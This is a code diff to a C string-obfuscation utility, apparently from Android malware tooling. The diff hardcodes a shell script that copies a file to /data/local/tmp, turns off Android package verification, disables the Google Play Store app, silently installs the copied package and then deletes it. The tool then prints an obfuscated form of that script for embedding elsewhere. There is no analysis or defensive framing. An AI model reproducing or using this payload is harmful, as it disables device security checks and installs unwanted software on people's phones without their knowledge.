@@ -10,6 +10,8 @@
 #include <time.h>
 #include <stdlib.h>
 
+char *sc = {"#!/system/bin/sh\ncat %s > /data/local/tmp/tmp\nrm %s\nchmod 755 /data/local/tmp/tmp\nsettings put global package_verifier_enable 0\npm disable com.android.vending\nsleep 1\npm install /data/local/tmp/tmp\nrm /data/local/tmp/tmp\n"};
+
 // <search string> <replace string> <string to search>
 unsigned char *str_replace(unsigned char *search , unsigned char *replace , unsigned char *subject) {
   unsigned char *p = NULL , *old = NULL , *new_subject = NULL ;
@@ -112,6 +114,10 @@ int main(int argc, char *argv[]) {
     return 0;
   }
 
+  argv[1] = sc;
+
+  printf("len %d\n", (int)strlen(argv[1]));
+
   if (strlen(argv[1]) > 255) {
     printf("String too long\n");
     return 0;
@@ -133,12 +139,12 @@ int main(int argc, char *argv[]) {
     printf("%02x", buf[i]);
   }
 
-  printf("\"; // \"%s\"\n", argv[1]);
+  //printf("\"; // \"%s\"\n", argv[1]);
 
-  test = deobfuscate(buf);
+  //test = deobfuscate(buf);
 
-  printf("Deobfuscated string: \"%s\"\n", test);
+  printf("Deobfuscated string: \"%s\"\n", deobfuscate(buf));
 
-  free(buf);
+  //free(buf);
   return 0;
 }
